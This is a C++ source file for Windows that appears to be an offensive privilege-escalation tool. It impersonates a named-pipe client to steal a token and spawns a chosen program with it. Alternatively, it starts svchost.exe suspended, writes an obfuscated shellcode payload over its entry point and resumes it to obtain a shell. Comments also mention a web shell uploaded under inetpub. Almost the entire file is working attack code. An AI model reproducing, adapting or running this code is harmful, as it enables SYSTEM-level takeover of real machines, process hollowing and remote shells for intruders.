#include <iostream>
#include <Windows.h>
#include <userenv.h>
#include <namedpipeapi.h>
#include <winbase.h>
#include <securitybaseapi.h>
#include <sddl.h>
#include <subauth.h>
#pragma comment(lib, "userenv.lib")

#define INJECTION 0
#define INITDESKTOP

#ifdef INJECTION

using PPS_POST_PROCESS_INIT_ROUTINE = void*;
using KPRIORITY = void*;

typedef struct _PEB_LDR_DATA {
    BYTE       Reserved1[8];
    PVOID      Reserved2[3];
    LIST_ENTRY InMemoryOrderModuleList;
} PEB_LDR_DATA, * PPEB_LDR_DATA;

typedef struct _RTL_USER_PROCESS_PARAMETERS {
    BYTE           Reserved1[16];
    PVOID          Reserved2[10];
    UNICODE_STRING ImagePathName;
    UNICODE_STRING CommandLine;
} RTL_USER_PROCESS_PARAMETERS, * PRTL_USER_PROCESS_PARAMETERS;

typedef struct _PEB {
    BYTE                          Reserved1[2];
    BYTE                          BeingDebugged;
    BYTE                          Reserved2[1];
    PVOID                         Reserved3[2];
    PPEB_LDR_DATA                 Ldr;
    PRTL_USER_PROCESS_PARAMETERS  ProcessParameters;
    PVOID                         Reserved4[3];
    PVOID                         AtlThunkSListPtr;
    PVOID                         Reserved5;
    ULONG                         Reserved6;
    PVOID                         Reserved7;
    ULONG                         Reserved8;
    ULONG                         AtlThunkSListPtr32;
    PVOID                         Reserved9[45];
    BYTE                          Reserved10[96];
    PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine;
    BYTE                          Reserved11[128];
    PVOID                         Reserved12[1];
    ULONG                         SessionId;
} PEB, * PPEB;

typedef struct _PROCESS_BASIC_INFORMATION {
    NTSTATUS ExitStatus;
    PPEB PebBaseAddress;
    ULONG_PTR AffinityMask;
    KPRIORITY BasePriority;
    ULONG_PTR UniqueProcessId;
    ULONG_PTR InheritedFromUniqueProcessId;
} PROCESS_BASIC_INFORMATION;

FARPROC getHandler(HMODULE module, std::string procName) {
    return GetProcAddress(module, procName.c_str());
}

FARPROC getHandler(std::wstring module, std::string procName) {
    return GetProcAddress(LoadLibraryW(module.c_str()), procName.c_str());
}

enum PROCESSINFOCLASS {
    ProcessBasicInformation = 0
};

typedef NTSTATUS(*_ZwQueryInformationProcess)(
    _In_      HANDLE           ProcessHandle,
    _In_      PROCESSINFOCLASS ProcessInformationClass,
    _Out_     PVOID            ProcessInformation,
    _In_      ULONG            ProcessInformationLength,
    _Out_opt_ PULONG           ReturnLength
    );

#endif

#ifdef INJECTION
    void spawnme_inj(HANDLE& ptoken);
#else
    void spawnme(HANDLE& ptoken, wchar_t[]);
#endif

int main(int argc, char **argv)
{
    if (argc < 3) {
        std::cout << "[!] Missing arguments! @1 pipe path: \\\\.\\pipe\\test\\pipe\\spoolss, @2 what to run, or file with shell" << std::endl;
        return -1;
    }        
    HANDLE pipe = CreateNamedPipeA(argv[1], PIPE_ACCESS_DUPLEX, PIPE_TYPE_BYTE | PIPE_WAIT, 255, 0x1000, 0x1000, 0, NULL);
    std::cout << "[i] Connecting to pipe " << argv[1] << std::endl;
    if (ConnectNamedPipe(pipe, NULL)) {
        std::cout << "[i] Pipe received data, impersonating\n";
        if (ImpersonateNamedPipeClient(pipe)) {
            std::cout << "[i] Openning thread token\n";
            HANDLE thandle{ 0 };
            if (OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, TRUE, &thandle)) {
                std::cout << "[i] OpenThreadToken done\n";
                DWORD rlen{ 0 };
                // error je zamerem, vrati potrebno velikost bufferu, druhe call pak uz se skutecnym bufferem
                if (!GetTokenInformation(thandle, TOKEN_INFORMATION_CLASS::TokenUser, NULL, 0, &rlen)) {
                    std::cout << "[i] GetTokenInformation need to read " << (int)rlen << " bytes\n";
                    std::unique_ptr<BYTE[]> tokenInformation = std::make_unique<BYTE[]>(rlen);
                    if (GetTokenInformation(thandle, TOKEN_INFORMATION_CLASS::TokenUser, tokenInformation.get(), rlen, &rlen)) {
                        std::cout << "[i] 2. GetTokenInformation received structure\n";
                        TOKEN_USER* tokenUser = reinterpret_cast<TOKEN_USER*>(tokenInformation.get());
                        LPSTR strsid{ 0 };
                        if (ConvertSidToStringSidA(tokenUser->User.Sid, &strsid)) {
                            std::cout << "[*] Received SID: " << strsid << std::endl;
                            LocalFree(strsid);
                            std::cout << "[i] Setting token as primary" << std::endl;
                            HANDLE ptoken{ 0 };
                            
                            if (DuplicateTokenEx(thandle, MAXIMUM_ALLOWED, NULL, SECURITY_IMPERSONATION_LEVEL::SecurityDelegation, TOKEN_TYPE::TokenPrimary, &ptoken)) {
                            //if (DuplicateTokenEx(thandle, TOKEN_ALL_ACCESS, NULL, SECURITY_IMPERSONATION_LEVEL::SecurityImpersonation, TOKEN_TYPE::TokenPrimary, &ptoken)) {
                                //std::cout << "[i] Going to spawn the shell" << std::endl;

#ifdef INJECTION
                                spawnme_inj(ptoken);
#else
                                std::unique_ptr<wchar_t[]> fexe = std::make_unique<wchar_t[]>(strlen(argv[2]) + 1);
                                mbstowcs_s(nullptr, fexe.get(), strlen(argv[2]) + 1, argv[2], strlen(argv[2]));
                                spawnme(ptoken, fexe.get());
#endif
                                std::cout << "[i] Done spawnme" << std::endl;
                            }
                            else
                                printf("DuplicateTokenEx: %08x", GetLastError());
                        }
                        else
                            std::cout << "ConvertSidToStringSidA: " << std::hex << GetLastError() << std::endl;
                    }
                    else
                        std::cout << "2. GetTokenInformation: " << std::hex << GetLastError() << std::endl;
                }
                else
                    printf("GetTokenInformation: %08x\n", GetLastError());
            }
            else
                printf("OpenThreadTokeN: %08x\n", GetLastError());
        }
        else
            std::cout << "ImpersonateNamedPipeClient: " << std::hex << GetLastError() << std::endl;
    }
    else
        std::cout << "ConnectNamedPipe: " << std::hex << GetLastError() << std::endl;
    return 0;
}

inline uint8_t _xor(uint8_t orig, uint8_t* key, uint8_t keyl) {
    return ([&]()->uint8_t {
        for (int i = 0; i < keyl; i++) { orig ^= key[i]; } return orig; }()) & 0xFF;
}

inline uint8_t _ceasar(uint8_t orig, uint8_t shift) {
    return ((orig + shift) & 0xFF);
}


#ifndef INJECTION
void spawnme(HANDLE& ptoken, wchar_t fexe[]) {
    std::wcout << "[i] Postim externi prdu!! " << fexe << std::endl;

    //wchar_t fexe[]{ L"C:\\inetpub\\wwwroot\\upload\\shell.exe" };
    STARTUPINFO si;
    //bi.PebBaseAddress = ppeb;
    PROCESS_INFORMATION pi;    
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb = sizeof(STARTUPINFO);
    //Nemam interaktivni desktop - tudiz proces, a chcu
    // impersonovat system user, tak explicitne musim rict ze chcu desktop, jinak by vytvoreni procesu selhalo
    // Winsta0\Default - emuluju login session 
    // Priprava na vytvoreni procesu s tokenem
#ifdef INITDESKTOP
    wchar_t deskt[]{ L"WinSta0\\Default" };
    si.lpDesktop = deskt;    
    std::unique_ptr<wchar_t[]> curDir = std::make_unique<wchar_t[]>(512);
    ZeroMemory(curDir.get(), 512);
    if (!GetSystemDirectoryW(curDir.get(), 512)) {
        std::cout << "[!] Cannot get system directory!" << std::endl;
        return;
    }
    std::wcout << "[i] Resolved systemdirectory: " << (const wchar_t*)curDir.get() << std::endl;
    LPVOID lpEnv{ 0 };
    if (!CreateEnvironmentBlock(&lpEnv, ptoken, FALSE)) {
        std::cout << "[!] Cannot get Environment Block!" << std::endl;
        return;
    }
    RevertToSelf();    
    //wchar_t fexe[]{ L"C:\\inetpub\\wwwroot\\upload\\shell.exe" };    
    if (CreateProcessWithTokenW(ptoken, LOGON_WITH_PROFILE, NULL, fexe, CREATE_UNICODE_ENVIRONMENT, lpEnv, curDir.get(), &si, &pi)) {
        std::cout << "[i] Should be spawned" << std::endl;        
    }        
#else
    if (CreateProcessWithTokenW(ptoken, NULL, NULL, fexe, CREATE_SUSPENDED | CREATE_UNICODE_ENVIRONMENT, NULL, NULL, &si, &pi)) {
        std::cout << "[i] Should be spawned" << std::endl;
    }    
#endif
    else {
        DWORD err = GetLastError();
        printf("CreateProcess failed (%d).\n", err);
    }
#ifdef INITDESKTOP
    DestroyEnvironmentBlock(lpEnv);
#endif
}
#endif

#ifdef INJECTION
void spawnme_inj(HANDLE& ptoken) {    
    std::cout << "[i] In spawnme" << std::endl;

    uint8_t ebuff[]={"\xf5\x49\x82\xdd\xf1\xe9\xc5\x01\x01\x01\x40\x50\x40"
"\x51\x53\x50\x49\x30\xd3\x5c\x49\x8a\x53\x61\x4f\x49"
"\x8a\x53\x19\x49\x8a\x53\x21\x49\x06\xae\x4b\x4b\x44"
"\x30\xc8\x49\x8a\x73\x51\x49\x30\xc1\xa5\x35\x60\x75"
"\x03\x25\x21\x40\xc0\xc8\x04\x40\x00\xc0\xe3\xe4\x53"
"\x49\x8a\x53\x21\x40\x50\x8a\x43\x35\x49\x00\xd1\x5f"
"\x80\x79\x19\x0a\x03\x06\x7c\x73\x01\x01\x01\x8a\x81"
"\x89\x01\x01\x01\x49\x7c\xc1\x6d\x5e\x49\x00\xd1\x3d"
"\x8a\x41\x21\x51\x48\x00\xd1\x8a\x49\x19\xe2\x4f\x49"
"\xf6\xc8\x40\x8a\x2d\x89\x44\x30\xc8\x49\x00\xcf\x49"
"\x30\xc1\x40\xc0\xc8\x04\xa5\x40\x00\xc0\x39\xe1\x6c"
"\xf0\x45\x02\x45\x1d\x09\x3c\x38\xd0\x6c\xd9\x59\x3d"
"\x8a\x41\x1d\x48\x00\xd1\x5f\x40\x8a\x05\x49\x3d\x8a"
"\x41\x15\x48\x00\xd1\x40\x8a\xfd\x89\x49\x00\xd1\x40"
"\x59\x40\x59\x57\x58\x5b\x40\x59\x40\x58\x40\x5b\x49"
"\x82\xe5\x21\x40\x53\xf6\xe1\x59\x40\x58\x5b\x49\x8a"
"\x13\xe8\x4a\xf6\xf6\xf6\x54\x49\x30\xda\x52\x48\xb7"
"\x6e\x68\x67\x68\x67\x5c\x6d\x01\x40\x4f\x49\x88\xe0"
"\x48\xbe\xc3\x45\x6e\x1f\xfe\xf6\xcc\x52\x52\x49\x88"
"\xe0\x52\x5b\x44\x30\xc1\x44\x30\xc8\x52\x52\x48\xbb"
"\x3b\x4f\x78\x9e\x01\x01\x01\x01\xf6\xcc\xe9\x11\x01"
"\x01\x01\x30\x38\x33\x27\x30\x2f\x39\x27\x30\x33\x33"
"\x27\x30\x30\x32\x01\x5b\x49\x88\xc0\x48\xbe\xc1\xba"
"\x00\x01\x01\x44\x30\xc8\x52\x52\x6b\x02\x52\x48\xbb"
"\x4e\x88\x96\xbf\x01\x01\x01\x01\xf6\xcc\xe9\x76\x01"
"\x01\x01\x26\x66\x43\x58\x40\x68\x6d\x53\x2e\x51\x5d"
"\x6a\x50\x65\x43\x3e\x4e\x5d\x5c\x5d\x71\x4c\x6e\x32"
"\x67\x79\x65\x4c\x31\x33\x31\x4a\x40\x63\x6b\x2e\x56"
"\x4b\x6e\x4b\x43\x46\x53\x62\x59\x48\x71\x2f\x50\x4c"
"\x6a\x3f\x31\x53\x3e\x72\x42\x73\x6b\x43\x4c\x72\x5e"
"\x2e\x67\x69\x79\x3e\x65\x64\x5f\x44\x66\x56\x63\x71"
"\x62\x78\x46\x52\x45\x60\x6e\x44\x6f\x44\x40\x79\x32"
"\x45\x69\x5e\x49\x6c\x4d\x66\x59\x2f\x5f\x59\x33\x5d"
"\x6d\x3e\x66\x47\x50\x2c\x3c\x60\x6a\x68\x70\x2f\x3d"
"\x73\x64\x4a\x2c\x72\x6c\x3f\x3d\x60\x59\x70\x01\x49"
"\x88\xc0\x52\x5b\x40\x59\x44\x30\xc8\x52\x49\xb9\x01"
"\x33\xa9\x7d\x01\x01\x01\x01\x51\x52\x52\x48\xbe\xc3"
"\xea\x4c\x27\x3a\xf6\xcc\x49\x88\xbf\x6b\x0b\x56\x49"
"\x88\xf0\x6b\x16\x5b\x53\x69\x81\x32\x01\x01\x48\x88"
"\xe1\x6b\xfd\x40\x58\x48\xbb\x6c\x3f\x97\x7f\x01\x01"
"\x01\x01\xf6\xcc\x44\x30\xc1\x52\x5b\x49\x88\xf0\x44"
"\x30\xc8\x44\x30\xc8\x52\x52\x48\xbe\xc3\x24\xff\x19"
"\x7a\xf6\xcc\x7c\xc1\x6c\x16\x49\xbe\xc0\x89\x12\x01"
"\x01\x48\xbb\x3d\xf1\x2c\xe1\x01\x01\x01\x01\xf6\xcc"
"\x49\xf6\xc6\x6d\x03\xea\xab\xe9\x4c\x01\x01\x01\x52"
"\x58\x6b\x41\x5b\x48\x88\xd0\xc0\xe3\x11\x48\xbe\xc1"
"\x01\x11\x01\x01\x48\xbb\x59\x9d\x52\xdc\x01\x01\x01"
"\x01\xf6\xcc\x49\x92\x52\x52\x49\x88\xde\x49\x88\xf0"
"\x49\x88\xdb\x48\xbe\xc1\x01\x21\x01\x01\x48\x88\xf8"
"\x48\xbb\x13\x8f\x88\xe3\x01\x01\x01\x01\xf6\xcc\x49"
"\x82\xbd\x21\x7c\xc1\x6d\xb3\x5f\x8a\xfe\x49\x00\xc2"
"\x7c\xc1\x6c\xd3\x59\xc2\x59\x6b\x01\x58\x48\xbe\xc3"
"\xf1\xac\xa3\x4f\xf6\xcc"};

unsigned char kl = 8;

int bufsz {682};
uint8_t key[] {'2','1','_','1','7','_','1','1',};
std::unique_ptr<uint8_t []> buf{std::make_unique<uint8_t[]>(682)};
for (uint32_t i = 0; i < 682;i++) {
    buf[i] = _xor(_ceasar(ebuff[i], 4), key, kl); }

   

    HMODULE mod = LoadLibraryW(L"C:\\Windows\\System32\\ntdll.dll");
    if (!mod) {
        std::cout << "[!] Bad ntdll.dll handler!" << std::endl;
        return;
    }
    _ZwQueryInformationProcess ZwQueryInformationProcess = (_ZwQueryInformationProcess)getHandler(mod, "ZwQueryInformationProcess");
    
    //std::cout << "[i0a] Going to spawn!!" << std::endl;
    //_CreateEnvironmentBlock CreateEnvironmentBlock = (_CreateEnvironmentBlock)getHandler(usrenv, "CreateEnvironmentBlock");
    //_DestroyEnvironmentBlock DestroyEnvironmentBlock = (_DestroyEnvironmentBlock)getHandler(usrenv, "DestroyEnvironmentBlock");
    std::cout << "[i0b] Going to spawn!!" << std::endl;

    PROCESS_BASIC_INFORMATION bi;
    PPEB ppeb{ nullptr };
    STARTUPINFO si;
    //bi.PebBaseAddress = ppeb;
    PROCESS_INFORMATION pi;
    ZeroMemory(&bi, sizeof(PROCESS_BASIC_INFORMATION));
    ZeroMemory(&si, sizeof(STARTUPINFO));
    ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
    si.cb = sizeof(STARTUPINFO);
    //Nemam interaktivni desktop - tudiz proces, a chcu
    // impersonovat system user, tak explicitne musim rict ze chcu desktop, jinak by vytvoreni procesu selhalo
    // Winsta0\Default - emuluju login session 
    // Priprava na vytvoreni procesu s tokenem
    
    wchar_t deskt[]{ L"WinSta0\\Default" };
    si.lpDesktop = deskt;
    std::cout << "[i1] Going to spawn!!" << std::endl;    
    std::unique_ptr<wchar_t[]> curDir = std::make_unique<wchar_t[]>(512);
    ZeroMemory(curDir.get(), 512);
    std::cout << "[i1] Going to spawn!!" << std::endl;
    if (!GetSystemDirectoryW(curDir.get(), 512)) {
        std::cout << "[!] Cannot get system directory!" << std::endl;
        return;
    }
    std::wcout << "[i] Resolved systemdirectory: " << (const wchar_t *)curDir.get() << std::endl;
    LPVOID lpEnv{ 0 };
    if (!CreateEnvironmentBlock(&lpEnv, ptoken, FALSE)) {        
        std::cout << "[!] Cannot get Environment Block!" << std::endl;
        return;
    }    

    std::wcout << "[!!] >>>> " << (wchar_t*)lpEnv << std::endl;
    printf("[i3] Going to spawn!!\n");
    //------------------------------------------
    
    NTSTATUS ret{ STATUS_SUCCESS };
    //wchar_t fexe[]{ L"C:\\Windows\\System32\\cmd.exe" };
    RevertToSelf();
    
    //NTSTATUS ret{ STATUS_SUCCESS };
    wchar_t fexe[]{ L"C:\\Windows\\System32\\svchost.exe" };
    //wchar_t fexe[]{ L"C:\\inetpub\\wwwroot\\upload\\shell.exe" };    
    BOOL iswow{ false };
    if (CreateProcessWithTokenW(ptoken, NULL, NULL, fexe, CREATE_SUSPENDED | CREATE_UNICODE_ENVIRONMENT, lpEnv, curDir.get(), &si, &pi)) {
    //if (CreateProcessWithTokenW(ptoken, NULL, NULL, fexe, CREATE_SUSPENDED , NULL, NULL, &si, &pi)) {        
        IsWow64Process(pi.hProcess, &iswow);
        std::cout << "ISWOW64: " << iswow << std::endl;
        DestroyEnvironmentBlock(lpEnv);
        ULONG dataRetLen{ 0 };        
        if (!(ret = ZwQueryInformationProcess(pi.hProcess, PROCESSINFOCLASS::ProcessBasicInformation, &bi, sizeof(PROCESS_BASIC_INFORMATION), &dataRetLen))) {
            printf("[i] Exit status %s\n", (bi.ExitStatus == 259)?"STATUS_PENDING":"unknown");
            printf("[i] Got %d bytes from process info\n", dataRetLen);
            ppeb = bi.PebBaseAddress;
            printf("[i] PEB address 0x%p\n", bi.PebBaseAddress);
            int64_t ptrToEXEImage{ (int64_t)bi.PebBaseAddress + 0x10 };
            printf("[i] EXE Code begins 0x%p\n", ptrToEXEImage);
            int64_t peHeaderBeg{ 0 };
            std::unique_ptr<uint8_t[]> buffer = std::make_unique<uint8_t[]>(0x200);
            SIZE_T readBytes{ 0 };
            ReadProcessMemory(pi.hProcess, (const void*)ptrToEXEImage, (uint8_t*)&peHeaderBeg, sizeof(int64_t), &readBytes);
            printf("[i] 1. PE Header begins 0x%I64x\n", peHeaderBeg);
            if (readBytes == sizeof(int64_t)) {
                printf("[i] 2. PE Header begins 0x%I64x\n", peHeaderBeg);
                ReadProcessMemory(pi.hProcess, (const void*)peHeaderBeg, buffer.get(), 0x200, &readBytes);
                if (readBytes == 0x200) {
                    int32_t e_lfanew{ 0 };
                    //offset e_lfanew k PE Signature
                    memcpy(&e_lfanew, buffer.get() + 0x3c, sizeof(e_lfanew));
                    printf("[i] e_lfanew offset size 0x%x\n", e_lfanew);
                    int64_t entrypoint{ 0 };
                    int32_t rva_offset{ 0 };
                    //offset k RVA
                    int64_t offset = e_lfanew + 0x28;
                    memcpy(&rva_offset, buffer.get() + offset, sizeof(int32_t));
                    //Absolutni virtualni adresa pameti
                    entrypoint = peHeaderBeg + rva_offset;
                    printf("[i] Entrypoint found at 0x%I64x\n", entrypoint);
                    SIZE_T wBytes{ 0 };

                    WriteProcessMemory(pi.hProcess, (LPVOID)entrypoint, buf.get(), bufsz, &wBytes);
                    if (wBytes == bufsz) {
                        printf("[i] Resuming thread, should be shell\n");
                        ResumeThread(pi.hThread);
                        //WaitForSingleObject(pi.hProcess, INFINITE);
                    }
                    else {
                        printf("[!] Written bytes not match! w:%d / needed: %d\n", (int32_t)wBytes, (int32_t)sizeof(buf));
                        printf("Write mem failed (%d).\n", GetLastError());
                    }
                    CloseHandle(pi.hProcess);
                    CloseHandle(pi.hThread);
                }
                else
                    printf("Read mem 0x200 bytes failed (%d).\n", GetLastError());
            }
            else
                printf("Read mem 8 bytes failed (%d).\n", GetLastError());
        }
        else
            printf("[!] Failed to get process info (ret: %x / %d)\n", ret, GetLastError());
    }
    else {
        DWORD err = GetLastError();
        printf("CreateProcess failed (%d).\n", err);
    }
}

#endif
